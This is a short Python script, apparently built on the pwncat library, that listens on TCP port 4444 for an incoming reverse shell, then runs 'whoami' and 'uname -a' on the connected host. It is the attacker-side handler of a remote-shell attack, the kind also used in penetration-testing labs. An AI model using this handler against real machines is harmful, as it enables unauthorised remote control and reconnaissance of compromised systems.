import pwncat

# Start a listener on port 4444 (adjust as needed)
listener = pwncat.listen("tcp://0.0.0.0:4444")

print("[*] Waiting for incoming reverse shell...")

# Accept the incoming connection and create a session
session = listener.accept()

print("[+] Connection received from", session.client)

# Run commands on the remote shell
output = session.run("whoami")
print("Remote user:", output)

output = session.run("uname -a")
print("System info:", output)

# Close the session when done
session.close()
